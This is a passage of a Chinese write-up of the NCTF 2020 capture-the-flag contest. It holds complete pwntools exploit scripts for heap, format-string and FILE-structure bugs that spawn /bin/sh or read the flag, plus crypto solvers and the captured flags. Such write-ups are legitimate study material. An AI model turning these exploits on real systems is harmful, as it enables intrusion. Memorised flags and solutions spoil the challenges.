漏洞点在于Login有个bsae64编码,此处会因为编码越界,而base64的字符表,我将+替换成%,/替换成了$  
在START的时候会调用一个字符串,而这个字符串就在刚才base64编码下面,所以通过越界修改掉这个格式化字符串,然后运行Start的时候就能利用格式化字符串漏洞  
本意是想要在栈上布置ROP,然后通过修改pritnf的返回地址为 pop rbx,r12,r13,r14,15;ret弹出5个参数再返回到ROP处getshell,太失败了,exp是预期解,TTTTTTCL  
```python
from pwn import*
import base64
def menu(ch):
	p.sendlineafter(': ',str(ch))
def login(payload):
	menu(1)
	tmp = 'rrrtql'.ljust(0x24,'F') + base64.b64decode(payload)
	p.sendlineafter('key',tmp)
p = process('./main')
#p = remote('42.192.180.50',25004)
libc =ELF('./libc-2.31.so')
login('+8/p+9/p')
menu(2)
p.recvuntil('0x')
stack = int(p.recv(12),16) + 8
log.info('Stack:\t' + hex(stack))
p.recvuntil('0x')
proc_base = int(p.recv(12),16) - 0x16DB + 0x10
log.info('PROC:\t' + hex(proc_base))
login('LIB+13/p')
menu(2)
p.recvuntil('LIB')
libc_base = int(p.recv(14),16) - 0x270B3# - 0x130
log.info('LIBC:\t' + hex(libc_base))
pop_rdi_ret = 0x0000000000026B72 + libc_base
ret = libc_base + 0x0000000000025679
payload  = '+' + str(((stack&0xFFFF) + 8)) + 'c+15/hn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((libc_base + libc.sym['system'])&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) + 8 + 1)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((libc_base + libc.sym['system'])>>8)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) + 8 + 2)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((libc_base + libc.sym['system'])>>16)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) + 8 + 3)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((libc_base + libc.sym['system'])>>24)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)
###############################################################################################
payload  = '+' + str(((stack&0xFFFF) - 8 + 0)) + 'c+15/hn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((libc_base + libc.search('/bin/sh').next())&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) - 8 + 1)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((libc_base + libc.search('/bin/sh').next())>>8)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) - 8  + 2)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((libc_base + libc.search('/bin/sh').next())>>16)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) -8 + 3)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((libc_base + libc.search('/bin/sh').next())>>24)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)


payload  = '+' + str(((stack&0xFF) -8 + 4)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((libc_base + libc.search('/bin/sh').next())>>32)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)


payload  = '+' + str(((stack&0xFF) -8 + 5)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((libc_base + libc.search('/bin/sh').next())>>40)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)
###############################
payload  = '+' + str(((stack&0xFFFF) - 0x10 + 0)) + 'c+15/hn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((pop_rdi_ret)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) - 0x10 + 1)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((pop_rdi_ret)>>8)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) - 0x10  + 2)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((pop_rdi_ret)>>16)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) -0x10 + 3)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((pop_rdi_ret)>>24)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)


payload  = '+' + str(((stack&0xFF) -0x10 + 4)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((pop_rdi_ret)>>32)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)


payload  = '+' + str(((stack&0xFF) -0x10 + 5)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((pop_rdi_ret)>>40)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) -0x10 + 6)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) -0x10 + 7)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

##################################
payload  = '+' + str(((stack&0xFFFF) + 0)) + 'c+15/hn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((ret)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF) + 1)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((ret)>>8)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str(((stack&0xFF)  + 2)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)

payload  = '+' + str((((ret)>>16)&0xFF)) + 'c+43/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)
##################################
payload  = '+' + str(((stack&0xFF) -0x40)) + 'c+15/hhn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)
magic_gadget = proc_base + 0x1733
payload  = '+' + str((magic_gadget&0xFFFF)) + 'c+43/hn'
payload  = payload.ljust(0x10,'F')
login(payload)
menu(2)
###############################
p.interactive()
```

### frenda
简单去个花,可以发现漏洞是因为%ld写入8字节,而作为size的变量只有四个字节,最后有个减法,所以可以越界对一个数作减法,减去的值是写入数据的长度  
此处的利用则是让buf_base减去一定的数值,将bufbase指向read_ptr,然后修改read_ptr,再用Leave时候的getchar打印出libc地址  
打印出libc 地址后,再通过控制_IO_2_1_stdin_的结构体中的buf_base和buf_end往malloc_hook中写入一个setcontext+61的地址  
然后再劫持stdin结构体的_chain指针,指向一个fake_IO,在edit的时候布置好fake_IO结构和SROP以及orw部分,最后在exit的时候,调用malloc 从而读出flag
```python
from pwn import*
#context.log_level = 'DEBUG'
context.arch = 'AMD64'
def menu(ch):
	p.sendlineafter('Choice>',str(ch))
def Create(size,content):
	menu(1)
	p.sendlineafter('the size of note',str(size))
	p.sendafter('U can input your note',content)
def C(payload):
	menu(1)
	p.sendafter('the size of note',payload)
def Modify(content):
	menu(2)
	p.sendafter('U can input your note',content)
def Leave(payload):
	menu(3)
	p.send(payload)
p = process('./main')
p = remote('42.192.180.50',25001)
libc =ELF('./libc-2.30.so')
p.sendlineafter('leave your name','FMYY')
Create((0x1FFFFF + (0x3EB9A8<<32)),'\x00'*0x73)
payload = '\x98'
C(payload)
retstr = ''
for i in range(8):
	menu(3)
	p.recvuntil('Now,U2 Choice:\t')
	retstr += p.recv(1)
libc_base = u64(retstr) - 0x1EA999
log.info('LIBC:\t' + hex(libc_base))

heap_base = libc_base - 0x201000
fake_IO_adress = heap_base + 0x10
frame_address = heap_base + 0x10 + 0xE0

malloc_hook = libc_base + libc.sym['__malloc_hook']
payload  = p64(libc_base + libc.sym['_IO_2_1_stdin_'] + 131)*5 + p64(malloc_hook) + p64(malloc_hook + 8)
payload += '\x00'*0x20 + p64(fake_IO_adress)

menu(3)
C(payload)
for i in range(211):
	menu(3)
magic_gadget = libc_base + libc.sym['setcontext'] + 61

#######

pop_rdi_ret = libc_base + 0x26BB2
pop_rdx_r12 = libc_base + 0x11C3B1
pop_rsi_ret = libc_base + 0x2709C
pop_rax_ret = libc_base + 0x28FF4
syscall = libc_base + 0x66199
jmp_rsi = libc_base + 0x3B805
malloc_hook = libc_base + libc.sym['__malloc_hook']
IO_str_jumps = libc_base + 0x1EC560

IO  = '\x00'*0x28
IO += p64(frame_address)
IO  = IO.ljust(0xD8,'\x00')
IO += p64(IO_str_jumps)

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = heap_base + 0x1000 - 0x100
frame.rdx = 0x2000
frame.rsp = heap_base + 0x1000 - 0x100
frame.rip = syscall

orw = shellcraft.open("flag",0)
orw += shellcraft.read("rax",heap_base+0x1000,0x30)
orw += shellcraft.write(1,heap_base+0x1000,0x30)

mprot  = p64(pop_rdi_ret) + p64(heap_base)
mprot += p64(pop_rsi_ret) + p64(0x10000)
mprot += p64(pop_rdx_r12) + p64(7) + p64(0)
mprot += p64(pop_rax_ret) + p64(10)
mprot += p64(syscall)
mprot += p64(pop_rsi_ret) + p64(heap_base + 0x1000 -0x100 + 0x68)
mprot += p64(jmp_rsi)
mprot += asm(orw)
IO += str(frame)
Modify(IO)
C(p64(magic_gadget))
menu(2)
p.sendlineafter('Error',mprot)
p.interactive()
```

### master_of_libc
TTTTTTTTTTCL,申请的堆块大小又没有限制好,导致一个师傅做出了非预期,哎,预期解法是:  
通过tcache smash unlink attack攻击global max fast,将这个值修改成一个很大的值  
然后通过free一个大块到stderr的flags位置,再edit这个块数据为/bin/sh字符串,再将这个块申请回来,stderr的flag位就会留下/bin/sh字符串  
同样修改IO_file_jumps里面的sync指针,改成system的指针  
最后修改global max fast将这个值修改成一个能够在我们申请的大小的最大值以下,并通过edit的越界,修改top_chunk的size,将其pre_inuse写为0,并写小,当再次申请一个块的时候,如果top_chunk不够大,就会进入sysmalloc中分配top_chunk,如果preinuse=0,则会触发一个断言错误,从而进入fflush(stderr),因此调用了system('/bin/sh')
```python
from pwn import*
context.log_level ='DEBUG'
def new(size):
	p.sendlineafter('Choice>','1')
	p.sendlineafter('note?',str(size))
def modify(index,off,content):
	p.sendlineafter('Choice>','2')
	p.sendlineafter('index:',str(index))
	p.sendlineafter('offset',str(off))
	p.sendafter("your note",content);
def free(index):
	p.sendlineafter('Choice>','3')
	p.sendlineafter('index:',str(index))
def gift(index,off,content):
	p.sendlineafter('Choice>','4')
	p.sendlineafter('index:',str(index))
	p.sendlineafter('offset',str(off))
	p.sendafter("your note",content);
while True:
	p = process('./main')
#	p = remote('42.192.180.50',25002)
	try:
		p.sendlineafter('leave your name','FMYY')
		p.recvuntil('number\n')
		byte = u8(p.recv(1))
		byte = byte*0x1000 - 0x87000
		for i in range(6):
			new(0x70)
		for i in range(6):
			free(i)
		for i in range(7):
			new(0x200)
		for i in range(7):
			free(i)
		new(0x200) #0
		new(0x200) #1
		new(0x10)  #2
		new(0x10)  #3
		new(0x1470)#4
		new(0x3A8) #5
		new(0x1AC0)#6
		new(0x2CE0)#7
		new(0x10)  #8
		#################
		modify(2,0x18,p64(0x1480 + 0x21))
		free(3)
		new(0x10) #3
		new(0x1470)#9
		#################
		free(1)
		new(0x180) #1
		new(0x1000)#10
		free(0)
		new(0x160) #0
		new(0x10)  #11
		new(0x100) #12
		gift(11,0x28,p32(byte + 0x1EDB78 - 0x10)[0:2])
		new(0x70)  #13
		#################
		free(4)
		modify(9,0,'/bin/sh\x00')
		new(0x1470)
		modify(3,0x18,p64(0x3301))
		free(4)
		modify(9,0x00,p32(byte + 0x554E0 + 0xE00000)[0:3])
		new(0x32F0)
		modify(3,0x18,p64(0x5FF1))
		free(4)
		modify(9,0x00,p64(0x2000))
		new(0x5FE0)
		##################
		new(0x3000) #14
		new(0x3000) #15
		free(14)
		new(0x2FE0) #14
		new(0x10)   #16
		free(15)
		modify(16,0x18,p64(0x1000))
		new(0x3000)
		p.sendline('ls')
		p.recvuntil('main')
		break
	except:
		p.close()
		continue
p.interactive()
```

### baby_vm

真的是个简单的vm。

披着vm皮的堆。

问题在于vm的push跟pop实现的时候，是先存放

分析指令可以知道大概的一些vm的opcode如下

```
#define push 0
#define pop 1
#define nop 2
#define inc 3
#define dec 4
#define sys 5
#define alloc 6
#define delete 7
#define ret 8
#define byte 0x10
#define word 0x20
#define dword 0x30
#define qword 0x40
```

之后分析可以发现push跟pop的检测esp跟ebp的检测位置有问题，导致了实际可写位置可以在堆的合法范围外。

也就是，alloc后通过push跟pop可以去溢出修改size。

之后就是堆的常规操作。

exp:

```python
from pwn import *
#r=process('./pwn')
r=remote('0.0.0.0',9999)
def ru(cmd):
	r.sendafter('plz input your code :',cmd)

def ret():
	return '\x08'

def add(size):
	return '\x06'+chr(size)

def free():
	return '\x07'

def push(content):
	return '\x00'+'\x40'+p64(content)

def pop():
	return '\x01\x40'

def read():
	return '\x05\x01'

def show():
	return '\x05\x02'

def gd(cmd=''):
	gdb.attach(r,cmd)
	pause()
#elf=ELF('./easy_vm')
#libc=elf.libc
libc=ELF('./libc.so.6')
payload=add(0xf0)+free()+add(0xe0)+free()+add(0xd0)+free()+add(0xc0)+free()+add(0xb0)+free()+add(0xa0)+free()+add(0x90)+free()+add(0xf0)+pop()+push(0x461)+free()+add(0x20)+show()+free()+ret()
ru(payload)
r.recvuntil('\n')
leak=u64(r.recv(8))
print hex(leak)
lbase=leak-1120-0x10-libc.symbols['__malloc_hook']
print hex(lbase)
payload=add(0x40)+free()+add(0x60)+free()+add(0x70)+push(0)+push(0xe1)+push(lbase+libc.symbols['__free_hook'])+free()+add(0xe0)+pop()+push(0x31)+free()+add(0xe1)+push(lbase+libc.symbols['system'])+free()+add(0x50)+read()+free()
sleep(0.1)
ru(payload)
sleep(0.1)
r.sendline('$0\x00')
r.interactive()
```

### libc_rpg

一个玩学长梗的题目

c++写的，ubuntu20.04下编译的。

思路来源于西湖论剑线下的rpg系列的题。仿照这大体模样自己整了个。

漏洞点存在有

bet时候没有校验负数，导致虽然输了，但是赢了钱（

copyuser时候只是把指针给复制过去，没有新申请一块，从而导致了uaf。

最后是在2.31下的，混用tcache与fastbin。

填满tcache后double free fastbin

最后把tcache全拿出来，再取出fastbin时候，会将fastbin放入tcache中，从而任意地址成为tcache。

```python
from pwn import *
#r=process('./libc_rpg')
r=remote('0.0.0.0',9999)
#elf=ELF('./libc_rpg')
#libc=elf.libc
libc=ELF('./libc-2.31.so')
def adduser():
    r.sendlineafter('>>','1')
    r.sendline('3')

def copyuser(idx1,idx2):
    r.sendlineafter('>>','2')
    r.sendlineafter('idx 1',str(idx1))
    r.sendlineafter('idx 2',str(idx2))

def freeuser(idx):
    r.sendlineafter('>>','3')
    r.sendlineafter('idx',str(idx))

def startgame(idx):
    r.sendlineafter('>>','4')
    r.sendlineafter(' file>>',str(idx))

def bet(money):
    r.sendlineafter('>>','3')
    r.sendlineafter('ay?','-'+str(money))

def buy():
    r.sendlineafter('>>','5')

def hit(name):
    r.sendlineafter('>>','2')
    r.sendlineafter('>>','2')
    r.sendafter(' weapon\n',name)

def show():
    r.sendlineafter('>>','6')

def ret():
    r.sendlineafter('>>','7')

def gd(cmd=''):
    gdb.attach(r,cmd)
    pause()
def rest():
    r.sendlineafter('>>','4')

def getweapon(i):
    adduser()
    startgame(i)
    bet(0x100000)
    buy()
    ret()
r.recvuntil('0x')
leak=int(r.recv(12),16)
print(hex(leak))
lbase=leak-libc.symbols['printf']
for i in range(9):
    getweapon(i)
startgame(7)
show()
r.recvuntil('ad :')
base=int(r.recv(1),10)
print(hex(base))
ret()
for i in range(7):
    freeuser(i)
copyuser(7,9)
copyuser(7,10)
freeuser(10)
freeuser(8)
freeuser(9)
startgame(7)
show()
r.recvuntil('ad :')
leak=int(r.recvline(),10)
hbase=leak&0xfffffffffffff000
print(hex(hbase))
print(hex(lbase))
target=hbase+0x4e0-0x10
for i in range(7):
    hit(p64(target))
    rest()
hit(p64(lbase+libc.symbols['__free_hook']))
rest()
hit(p64(lbase+libc.symbols['__free_hook']))
rest()
hit(p64(lbase+libc.symbols['system']))
rest()
hit(p64(lbase+libc.symbols['system']))
rest()
hit('/bin/sh\x00')
ret()
freeuser(7)
r.interactive()
```


## Crypto

### RSA_revenge

这题考点很明显，分解一个特殊的素数，可以查到这个算法， Qi Cheng factorization。

论文链接 https://eprint.iacr.org/2002/109.pdf

所以需要实现一下这个算法，或者找一找类似的实现改一改就差不多可以了。

由于会用到椭圆曲线，所以用sagemath会方便很多，有一点是进行 *polynomial division* 的时候容易超过默认的递归深度，所以需要用`sys.setrecursionlimit(10**6)`手动设置一下递归深度。（`sys.getrecursionlimit()` 可以查看当前的递归深度）

exp.sage

```python
import hashlib
import string
import sys
from functools import reduce

from Crypto.Util.number import *
from gmpy2 import invert
from pwn import *

HOST = "xx.xxx.xxx.xx"
POST = 30004
r = remote(HOST, POST)
sys.setrecursionlimit(10**6)


def proof_of_work():
    rev = r.recvuntil("sha256(XXXX+")
    suffix = r.recv(16).decode()
    rev = r.recvuntil(" == ")
    tar = r.recv(64).decode()

    def f(x):
        hashresult = hashlib.sha256(x.encode()+suffix.encode()).hexdigest()
        return hashresult == tar

    prefix = util.iters.mbruteforce(
        f, string.digits + string.ascii_letters, 4, 'upto')
    r.recvuntil("Give me XXXX:")
    r.sendline(prefix)


def qicheng(n: int):
    R = Integers(n)
    js = [0, (-2 ^ 5) ^ 3, (-2 ^ 5*3) ^ 3, (-2 ^ 5*3*5*11) ^ 3, (-2 ^ 6*3*5*23*29) ^ 3]
    p, q = None, None
    for _ in range(20):
        for j in js:
            if j == 0:
                a = R.random_element()
                E = EllipticCurve([0, a])
            else:
                a = R(j)/(R(1728)-R(j))
                c = R.random_element()
                E = EllipticCurve([3*a*c ^ 2, 2*a*c ^ 3])

            x = R.random_element()
            z = E.division_polynomial(n, x)
            g = gcd(z, n)
            if g > 1:
                p = Integer(g)
                q = Integer(n)//p
                break
        if p:
            break
    return (p, q)


proof_of_work()
r.recvuntil(b"n = ")
n = int(r.recvline().strip().decode())
r.recvuntil(b"e = ")
e = int(r.recvline().strip().decode())
r.recvuntil(b"c = ")
c = int(r.recvline().strip().decode())
p, q = qicheng(n)
secret = pow(c, inverse_mod(e, (p-1)*(q-1)), n)
r.sendline(b"1")
r.recvuntil(b"> ")
r.sendline(str(secret).encode())
r.interactive()

```

NCTF{1n_c4se_I_d0nt_s33_ya'__g00d_4ftern00n_g00d_ev3ning_4nd_g00dnight}

### RDH

这题考的是 `Reversible Data Hiding in Paillier Cryptosystem` ，其实就是解一个 Paillier 加密。。。

n 包含P+1平滑的素数，所以用 Williams P+1 算法来分解。

然后简单用了一下 `Paillier` 的加法同态性，加密的灰阶图片每个像素值范围在 0-255（低 8 位），flag 在第 9 位（最高位）。

所以解密的明文右移8位取到的高位连起来就是flag。

//然而学弟出了非预期，tql

```python
from Crypto.Util.number import *
from PIL import Image
import numpy as np
from random import randint
from gmpy2 import lcm
from time import time

f = open("./data", "r")

enc_array = [[int(f.readline(), 16) for i in range(56)] for j in range(56)]


class Homo:
    def __init__(self, p, q, g):
        n = p*q
        self.Lcm, self.g, self.n = lcm(p-1, q-1), g, n

    def enc(self, m):
        n = self.n
        return (pow(self.g, int(m), n*n)*pow(randint(1, n), n, n*n)) % (n*n)

    def dec(self, c):
        Lcm, g, n = self.Lcm, self.g, self.n
        m_c = self.L(pow(int(c), Lcm, n*n), n)
        m_g = self.L(pow(g, Lcm, n*n), n)
        m = m_c*inverse(m_g, n) % n
        return m

    def L(self, u, n): return (u-1)//n


p = 920030180993553288263122542539734999091858791109976215768537891947750855619097640972095906356285305444101336426283673752755681547142872561321116642210086677
q = 20036833404343748910594730341422855344330336172344618244064374346563598951077324170195570326117609597963864455286619066691990061602675671685401923755961088093
g = 99894228586367782940715460732971967417359410558715186789679488951080212107512884192976002563404881263875114900183845944243751294600634946131559701908524899495387780188074842981190381617301097312646907480816373003121403029154865843313001145153263200356271270964096284006748227606839491672635131818273934109984977288621523498782962389115299664149676881349445940131040928322172748228670542470966453917916224551852329336572423059849239115479150176538160893340622774682474615303826972971312087884483400100816655408278649954266707268236152380355955111697822333005733513834283677509165970313043388621472231706074701389916165894223877

ho = Homo(p, q, g)
img = Image.new("L", (56, 56))
img_array = np.array(img)
flag = ""

for i in range(len(enc_array)):
    for j in range(len(enc_array[i])):
        m = ho.dec(enc_array[i][j])
        flag += str(m//256)
        img_array[i][j] = m % 256
dec_img = Image.fromarray(img_array)
dec_img.save("dec.png")

for i in range(8):
    m = long_to_bytes(int(flag+"0"*i, 2))
    if m[:4] == b"NCTF":
        print(m)

# NCTF{R3v3r5ibLe_D4t4_H1d1ng_1N_P4illi3r_Crypt0sy5t3m}
```

### RRSA
共模攻击


NCTF{W3_1augh3d_4nd_k3pt_say1ng_s33_u_s00n__but_ins1d3_w3_b0th_kn3w_we_d_n3ver_see_e4ch_0ther_4gain}

### RRRSA
共模攻击Plus

[Cryptanalysis of RSA and Its Variants
](http://index-of.es/Varios-2/Cryptanalysis%20of%20RSA%20and%20It's%20Variants.pdf)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/3B650745-8575-4F71-BBAD-8A92015B3D36.png)

界卡的比较死，3组多试几次应该就有了，有雅致的话也可以尝试去构造一下4组的格子。

NCTF{Aft3r_411__t0morr0w_1s_an0ther_d4y}

### Oracle
mini版[Bleichenbacher Attack](https://crypto.stackexchange.com/questions/12688/can-you-explain-bleichenbachers-cca-attack-on-pkcs1-v1-5)

20级学弟的exp：

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/0F7A2746-6A01-4790-8B3B-0684A4F050B9.png)

NCTF{M4rry_1n_hast3__4nd_r3pen7_4t_le1sure}




## Summary
可能今年跟好几个比赛都撞了，好像都没多少师傅来玩我们的NCTF 2020。。。

Anyway，十分感谢大家来参加我们的NCTF 2020！

欢迎大家明年再来玩鸭！